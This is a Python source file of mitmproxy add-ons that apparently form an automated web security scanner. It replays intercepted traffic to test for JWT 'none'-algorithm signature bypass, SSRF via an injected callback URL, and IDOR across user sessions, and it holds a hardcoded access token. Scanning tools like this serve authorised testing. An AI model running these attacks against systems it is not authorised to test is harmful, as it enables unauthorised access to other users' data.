import json
from mitmproxy import http
from helpers import *
import json, hashlib
from constants import DOMAIN_REGEX_STRING, IP_REGEX_STRING,PATH_REGEX_STRING, DETECTOR_SERVER_HOST, DETECTOR_SERVER_PORT, PROXY_HOST, PROXY_PORT
import time
from uuid import uuid4
import threading


class RerouteAgent:
    # sample add-on that reroutes the request or stops it according to certain rules
    def request(self, flow: http.HTTPFlow):
        # redirect to different host
        if flow.request.pretty_host == "google.com":
            flow.request.host = "mitmproxy.org"
        # answer from proxy
        elif flow.request.path.endswith("/brew"):
            flow.response = http.Response.make(
                418, b"I'm a teapot",
            )


class RequestLogger:
    # sample add-on that prints the request passing through
    def request(self, flow: http.HTTPFlow):
        print(flow.request)


class JWTNoneAlgAttack:
    BENCHMARK_LABEL = 'JWT_NONE_ALG_BENCHMARK' # label for the benchmark failing flow
    ATTACK_LABEL = 'JWT_NONE_ALG_ATTACK' # label for the attack flow
    affected_endpoints = set()

    def request(self, flow: http.HTTPFlow):
        if get_jwt(flow.request.cookies) is None:
            return # No JWT token
        
        if flow.request.path.find('socket.io') != -1 or not is_request_in_scope(flow):
            return
        
        if not hasattr(flow, 'label') and flow.request.path not in self.affected_endpoints:  
            benchmark_flow = flow.copy()
            benchmark_flow.label = self.BENCHMARK_LABEL
            benchmark_flow.request.headers.pop('Authorization', None)
            benchmark_flow.request.cookies['token'] = generate_none_token_with_signature(get_jwt(flow.request.cookies))
            replay_flow(benchmark_flow)


    def response(self, flow: http.HTTPFlow):
        if get_jwt(flow.request.cookies) is None:
            return # No JWT token
        
        if flow.request.path.find('socket.io') != -1:
            return # socket.io request

        if not hasattr(flow, 'label'):
            return # No label attribute (not a replayed request i.e. original request)
        
        if flow.label == self.BENCHMARK_LABEL:
            attack_flow = flow.copy()
            attack_flow.label = self.ATTACK_LABEL
            attack_flow.benchmark_hash = hash(flow.response.text)
            attack_flow.request.headers.pop('Authorization', None)
            attack_flow.request.cookies['token'] = drop_token_signature(get_jwt(flow.request.cookies))
            replay_flow(attack_flow)
        elif flow.label == self.ATTACK_LABEL:    
            if flow.benchmark_hash != hash(flow.response.text):
                self.affected_endpoints.add(flow.request.path)
                print_attack_success(self.ATTACK_LABEL, flow)
                report_attack(self.ATTACK_LABEL, flow)
            else:
                pass # attack failed
        else:
            pass # not a replayed request


class SSRFAttack:
    ATTACK_LABEL = 'SSRF'
    pulse_active = False
    possible_ssrf_flows = dict()


    def build_ssrf_attack_url(self, token):
        return f'http://{DETECTOR_SERVER_HOST}:{DETECTOR_SERVER_PORT}/report_ssrf/{token}'


    def create_ssrf_attack(self, flow: http.HTTPFlow, param_location, param_name):
        ssrf_attack_token = uuid4().hex  # generate a random token
        self.possible_ssrf_flows[ssrf_attack_token] = flow
        attack_flow = flow.copy()
        attack_flow.label = self.ATTACK_LABEL
        ssrf_attack_url = self.build_ssrf_attack_url(ssrf_attack_token)
        if param_location == 'query':
            attack_flow.request.query[param_name] = ssrf_attack_url # use an attack url with a random token
            replay_flow(attack_flow)
        if param_location == 'urlencoded_form':
            attack_flow.request.urlencoded_form[param_name] = ssrf_attack_url # use an attack url with a random token
            replay_flow(attack_flow)


    def send_pulse_request(self):
        requests.get(
            f'http://{DETECTOR_SERVER_HOST}:{DETECTOR_SERVER_PORT}/get_reports',
            params={
                'access_token': 'b43c9fe7a5c16adfbf0027f6bded4f0b0df47632c0eacfb7d72301c27124a288',
                'pulse_request_id': uuid4().hex,
            },
            proxies= {
                'http': f'http://{PROXY_HOST}:{PROXY_PORT}',
            },
        )


    def activate_pulsing(self):
        while self.pulse_active:
            self.send_pulse_request()
            print('-> SSRF pulse..')
            time.sleep(6)
        return


    def is_param_testable(self, param_value):
        for REGEX in [ DOMAIN_REGEX_STRING, PATH_REGEX_STRING, IP_REGEX_STRING]:
            if re.match(REGEX, param_value):
                return True
        return False
    

    def request(self, flow: http.HTTPFlow):
        if hasattr(flow, 'ignore') or hasattr(flow, 'label') or not is_request_in_scope(flow):
            return

        for param_name, param_value in flow.request.query.items():
            if self.is_param_testable(param_value):
                self.create_ssrf_attack(flow, 'query', param_name)
                if not self.pulse_active:
                    self.pulse_active = True
                    print('SSRF pulse activated..')
                    threading.Thread(target=self.activate_pulsing).start()  # send a pulse

        for param_name, param_value in flow.request.urlencoded_form.items():
            if self.is_param_testable(param_value):
                self.create_ssrf_attack(flow, 'urlencoded_form', param_name)
                if not self.pulse_active:
                    self.pulse_active = True
                    print('pulse activated')
                    threading.Thread(target=self.activate_pulsing).start()  # send a pulse


    def response(self, flow: http.HTTPFlow):       
        if flow.response.headers.get('Pulse-Request-Id', None) and flow.response.headers['Pulse-Request-Id'] == flow.request.query['pulse_request_id']:
            reponse = flow.response.json()
            for token in set(reponse):
                if token in self.possible_ssrf_flows.keys(): 
                    print_attack_success(self.ATTACK_LABEL, self.possible_ssrf_flows[token])
                    report_attack(self.ATTACK_LABEL, self.possible_ssrf_flows[token])


class IdorAttack:
    ATTACK_LABEL = 'IDOR'
    user_endpoints_map = {}

    def is_identifier(self, content):
        try:
            int(content)
            return True
        except:
            return False


    def get_request_token(self, flow: http.HTTPFlow):
        if len(flow.request.path_components) and not self.is_identifier(flow.request.path_components[-1]):
            return
        return '/'.join(flow.request.path_components[:-1])
    

    def get_user_session_fingerprint(self, flow: http.HTTPFlow):
        cookies_serialized = json.dumps(dict(flow.request.cookies))
        return hashlib.md5(cookies_serialized.encode('utf-8')).hexdigest()
    

    def get_response_fingerprint(self, flow: http.HTTPFlow):
        if flow.request.text:
            return hashlib.md5(flow.request.text.encode('utf-8')).hexdigest()
        return None


    def add_endpoint_tracking(self, flow: http.HTTPFlow, request_token):
        request_path_object = self.user_endpoints_map.get(request_token)
        
        if not request_path_object:
            self.user_endpoints_map[request_token] = {
                'ignore_path': False,
                'sub_paths': {
                    flow.request.path: {
                        'flow': flow,
                        'owner': self.get_user_session_fingerprint(flow),
                    },
                },
            }
            return
        
        if request_path_object['ignore_path']:
            return

        if not request_path_object['sub_paths'].get(flow.request.path):
            request_path_object['sub_paths'][flow.request.path] = {
                'flow': flow,
                'owner': self.get_user_session_fingerprint(flow)
            }
            
            if len(request_path_object['sub_paths'].keys()) > 2:
                request_path_object['ignore_path'] = True
            return
        
        if request_path_object['sub_paths'][flow.request.path]['owner'] != self.get_user_session_fingerprint(flow):
            request_path_object['ignore_path'] = True


    def is_idor_possible(self, request_token):
        if self.user_endpoints_map.get(request_token)['ignore_path']:
            return False
        
        paths = self.user_endpoints_map.get(request_token)['sub_paths']
        # print("___________TESTING: ", request_token, paths.keys())
        return len(paths.keys()) == 2 and len(set(obj['owner'] for obj in paths.values())) == 2


    def is_attack_successful(self, flow: http.HTTPFlow):
        return self.get_response_fingerprint(flow) == flow.TARGET_RESP_FINGERPRINT


    def request(self, flow: http.HTTPFlow):
        if hasattr(flow.request, 'ignore'):
            return


    def response(self, flow: http.HTTPFlow):
        if hasattr(flow, 'label'):
            if flow.label == self.ATTACK_LABEL and self.is_attack_successful(flow):
                print_attack_success(self.ATTACK_LABEL, flow)
                request_token = self.get_request_token(flow)
                self.user_endpoints_map.get(request_token)['ignore_path'] = True
                report_attack(self.ATTACK_LABEL, flow)
            return
        
        request_token = self.get_request_token(flow)

        if not is_request_in_scope(flow) or not request_token:
            return

        self.add_endpoint_tracking(flow, request_token)
        # print(self.user_endpoints_map)

        if self.is_idor_possible(request_token):
            # test idor here
            # print('********** IDOR possible in: ', request_token)
            
            other_path_obj = [
                path_obj for path_obj
                in self.user_endpoints_map.get(request_token)['sub_paths'].items()
                if path_obj[0] != flow.request.path
            ][0][1]
            
            # print('_____sibling:', other_path_obj)
            
            target_flow = other_path_obj['flow']
            attack_flow = flow.copy()
            attack_flow.label = self.ATTACK_LABEL
            attack_flow.TARGET_RESP_FINGERPRINT = self.get_response_fingerprint(target_flow)
            replay_flow(attack_flow)
